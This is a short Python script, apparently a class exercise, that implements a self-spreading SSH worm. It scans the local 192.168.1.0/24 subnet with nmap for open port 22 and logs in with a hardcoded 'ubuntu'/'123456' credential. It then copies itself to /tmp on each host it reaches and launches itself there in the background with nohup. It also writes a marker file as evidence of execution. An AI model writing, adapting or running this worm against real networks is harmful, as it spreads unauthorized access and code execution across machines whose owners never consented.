import paramiko
import os
import sys
import nmap

def getHostsOnTheSameNetwork():

        # Create an instance of the port scanner class
        portScanner = nmap.PortScanner()

        # Scan the network for systems whose
        # port 22 is open (that is, there is possibly
        # SSH running there). 
        portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

        # Scan the network for hoss
        hostInfo = portScanner.all_hosts()

        # The list of hosts that are up.
        liveHosts = []

        # Go trough all the hosts returned by nmap
        # and remove all who are not up and running
        for host in hostInfo:

                # Is ths host up?
                if portScanner[host].state() == "up":
                        liveHosts.append(host)



        return liveHosts

# Open the file and write something to it.
# We will use this as evidence that the worm
# has executed on the remote system
fileObj = open("/tmp/file.txt", "w")

# Write something to the file
fileObj.write("Has anyone really been far as decided to use even go want to do more like?")

# Close the file
fileObj.close()

# Create an instance of the SSH client
ssh = paramiko.SSHClient()

# Set some parameters to make things easier.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
sniffedFoxes = getHostsOnTheSameNetwork()
for sniffs in sniffedFoxes:
	try:
		# Connect to the remote system.
		ssh.connect(sniffs, username="ubuntu",password="123456")
		sftpClient = ssh.open_sftp()
		try:
			sftpClient.stat("/tmp/luis_covarrubias.py")
			print "This has been marked SON!"
		except:
			sftpClient.put("/tmp/luis_covarrubias.py", "/tmp/" + "luis_covarrubias.py")
			ssh.exec_command("chmod a+x /tmp/luis_covarrubias.py")
			ssh.exec_command("nohup python /tmp/luis_covarrubias.py &")
	except:
		print "Something went wrong in " + sniffs

